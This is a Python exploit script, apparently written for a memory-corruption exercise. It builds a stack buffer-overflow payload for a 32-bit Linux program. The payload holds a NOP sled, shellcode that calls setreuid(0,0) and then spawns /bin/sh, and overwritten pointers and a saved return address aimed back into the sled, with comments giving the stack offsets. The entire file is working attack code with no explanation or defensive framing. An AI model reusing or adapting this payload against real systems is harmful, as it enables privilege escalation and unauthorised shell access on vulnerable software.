import struct, sys

def main():
    zero_address = int(sys.argv[1], 16)
    p_zero_address = struct.pack("I", zero_address)
    p_nop_sled_start = struct.pack("I", zero_address-(0x100))

    # Offsets from esp after strcpy
    # 0x1a    - start of buffer (NOPsled + shellcode)
    # 0x11a   - zero (marked with BB)
    # 0x11c   - address of malloc'd buffer (Overwrite with zero address)
    # 0x128   - saved frame pointer
    # 0x12c   - saved EIP

#    shellcode = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
    shellcode = "\x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
    pre_pad = "\x90" * (256 - len(shellcode))
    payload = pre_pad[:-10] + shellcode + pre_pad[-10:] + "BB" + p_zero_address + "X"*12 + p_nop_sled_start

    # Need to make up 65536 bytes
    post_pad = "\x90" * (65536 - len(payload))
    payload = payload + post_pad

    sys.stdout.write(payload)

if __name__ == "__main__":
    main()
